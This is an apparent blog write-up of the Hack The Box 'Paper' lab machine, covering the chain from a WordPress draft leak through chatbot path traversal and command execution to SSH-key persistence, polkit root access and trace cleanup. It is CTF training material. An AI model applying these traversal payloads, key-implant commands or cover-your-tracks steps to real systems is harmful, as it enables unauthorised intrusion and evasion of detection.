+++
title = "Hack The Box - Paper"
tags = [
    "ctf"
]
date = "2022-04-01"
toc = true
+++

# Premise

As with all Hack The Box (HTB) `Machines` we're given nothing more than an IP.

Initial target enumeration with `nmap` shows us TCP 22, 80, and 443 open, with SSH and Apache 2.4.37 respectively. The TLS information returned isn't super helpful, and hitting the website gives us nothing more than the default CentOS Apache httpd page.

# Further exploration

Next step, after a lot of poking, prodding, fuzzing, etc... and getting nowhere was to try out `nikto` to see if there's anything else the webserver might be leaking for us.

Fortunately there is - a potential host name of `office.paper` thanks to a `x-backend-server` header. Presumably this is for name-based virtual hosts with Apache, so let's add it to `/etc/hosts` with the target IP and see what we get.

Bingo. A wordpress blog.

# wordpress? moar like insecurepress, m i rite?

Joking aside, this is running an _ancient_ version of Wordpress from back in 2019. This will become useful shortly.

From initial poking around there's no much of interest, other than the singular response to any of the blog posts there, and it's chastising the author for leaving sensitive data in drafts. Hmmm... Is there a way we can access those?

[Yes, there is.](https://www.exploit-db.com/exploits/47690).

With this knowledge, we can just hit http://office.paper/?status=1 and right away we've got the information we need to move to our next step - RocketChat.

# I, for one, welcome our robot overlords

After using the signup link from the draft, and getting access to RocketChat, there's some juicy info there about a chat bot that can be used to do various business things... but also, for some insane reason, to list files and get their contents. Ripe for exploitation.

We can get directory listings with `recyclops list sale` as the example, but as it turns out this also allows for relative paths.

```
4:55 PM
recyclops list sale/../..
Bot
4:55 PM
Fetching the directory listing of sale
total 4
drwxr-xr-x 2 dwight dwight 27 Sep 15 2021 .
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 ..
-rw-r--r-- 1 dwight dwight 158 Sep 15 2021 portfolio.txt
Fetching the directory listing of sale/..
total 0
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 .
drwx------ 12 dwight dwight 323 Apr 1 16:26 ..
drwxr-xr-x 2 dwight dwight 27 Sep 15 2021 sale
drwxr-xr-x 2 dwight dwight 27 Jul 3 2021 sale_2
Fetching the directory listing of sale/../..
total 64
drwx------ 12 dwight dwight 323 Apr 1 16:26 .
drwxr-xr-x. 3 root root 20 Jan 14 06:50 ..
lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -> /dev/null
-rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout
-rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile
-rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc
-rwxr-xr-x 1 dwight dwight 1174 Sep 16 2021 bot_restart.sh
drwx------ 5 dwight dwight 56 Jul 3 2021 .config
-rw------- 1 dwight dwight 9 Apr 1 16:26 .dbshell
-rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth
drwx------ 3 dwight dwight 69 Apr 1 16:26 .gnupg
drwx------ 8 dwight dwight 4096 Sep 16 2021 hubot
-rw-rw-r-- 1 dwight dwight 18 Sep 16 2021 .hubot_history
-rwxrwxr-x 1 dwight dwight 25152 Apr 1 14:22 jeTNike
drwx------ 3 dwight dwight 19 Jul 3 2021 .local
drwxrwxr-x 2 dwight dwight 27 Apr 1 14:22 lol
drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla
drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales
drwx------ 2 dwight dwight 29 Apr 1 16:07 .ssh
-r-------- 1 dwight dwight 33 Apr 1 14:12 user.txt
drwxr-xr-x 2 dwight dwight 24 Sep 16 2021 .vim
```

There's the user flag, let's see if we can get it.

```
4:56 PM
recyclops file sale/../../user.txt
Bot
4:56 PM
Access denied. 
```

Nope! Let's see what else is there.

I see a `bot_restart.sh` script. Let's check it with `recyclops file sale/../../bot_restart.sh`

```
 <!=====Contents of file sale/../../bot_restart.sh=====>
#!/bin/bash

# Cleaning hubot's log so that it won't grow too large.
echo "" > /home/dwight/hubot/.hubot.log


# For starting the bot 20-ish (10+20) seconds late, when the server is restarted.
# This is because MongoDB and Rocket-Chat server needs some time to startup properly
sleep 10s

# Checks if Hubot is running every 10s
while [ 1 ];
do
sleep 20s
alive=$(/usr/sbin/ss -tulnp|grep 8000);
if [[ -n $alive ]]; then
err=$(grep -i 'unhandled-rejections=strict' /home/dwight/hubot/.hubot.log)
if [[ -n $err ]]; then
# Restarts bot
echo "[-] Bot not running!
date";
#Killing the old process
pid=$(ps aux|grep -i 'hubot -a rocketchat'|grep -v grep|cut -d " " -f6);
kill -9 $pid;
cd /home/dwight/hubot;
# Cleaning hubot's log so that it won't grow too large.
echo "" > /home/dwight/hubot/.hubot.log
bash /home/dwight/hubot/start_bot.sh&
else


echo "[+] Bot running succesfully! date";
fi

else
# Restarts bot
echo "[-] Bot not running! date
";
#Killing the old process
pid=$(ps aux|grep -i 'hubot -a rocketchat'|grep -v grep|cut -d " " -f6);
kill -9 $pid;
cd /home/dwight/hubot;
bash /home/dwight/hubot/start_bot.sh&
fi

done
<!=====End of file sale/../../bot_restart.sh=====>
```

Ok, looks like the bot stuff is all under `/home/dwight/hubot`, let's see what it can do.

We can see what scripts it can run with `recyclops list ../hubot/scripts/` which shows us a `cmd.coffee`.

```
 <!=====Contents of file ../hubot/scripts/cmd.coffee=====>
# Description:
# Runs a command on hubot
# TOTAL VIOLATION of any and all security!
#
# Commands:
# hubot cmd <command> - runs a command on hubot host

module.exports = (robot) ->
robot.respond /CMD (.*)$/i, (msg) ->
# console.log(msg)
@exec = require('child_process').exec
cmd = msg.match[1]
msg.send "Running [#{cmd}]..."

@exec cmd, (error, stdout, stderr) ->
if error
msg.send error
msg.send stderr
else
msg.send stdout
# Description:
# Runs a command on hubot
# TOTAL VIOLATION of any and all security!
#
# Commands:
# hubot cmd <command> - runs a command on hubot host

module.exports = (robot) ->
robot.respond /CMD (.*)$/i, (msg) ->
# console.log(msg)
@exec = require('child_process').exec
cmd = msg.match[1]
msg.send "Running [#{cmd}]..."

@exec cmd, (error, stdout, stderr) ->
if error
msg.send error
msg.send stderr
else
msg.send stdout
<!=====End of file ../hubot/scripts/cmd.coffee=====>
```

What does it do? Exactly what you think... RCE, but at least it's scoped to a non-root user.

```
5:02 PM
recyclops cmd whoami
Bot
5:02 PM
Running [whoami]...
Running [whoami]...
dwight
dwight
```

We can use this to get the `user.txt` flag as a starting point with `recyclops cmd cat /home/dwight/user.txt`:

```
 Running [cat /home/dwight/user.txt]...
c1ff88de...
```

# Foothold & `rfoot`

We can add our own public key into `dwight`'s authorized keys with this and use that as a starting point:

```
recyclops cmd echo ssh-rsa <key goes here> >> /home/dwight/.ssh/authorized_keys
```

And we're in with a stable shell.

```
[dwight@paper ~]$
```

*Note*: Another approach here could be use `recyclops` to spawn a reverse shell. While that _might_ be better for not leaving fingerprints (literally our SSH public key), it means we have to deal with getting a stable shell from there. This is easier, and for a CTF I'll take that tradeoff.

Now that we're in, we can see that `dwight` has no `sudo` privs - prompting for a password just to run `sudo -l`, so that's a no go.

Let's just go for the gold [with `polkit` sploitz](https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py) and see if it works.

Yep.

```
[root@paper shm]#
[root@paper shm]# cat /root/root.txt
7402782...
```

Time to clean up and get out - delete the `authorized_keys` entry, delete the `polkit` exploit script, and clear history.

GG!
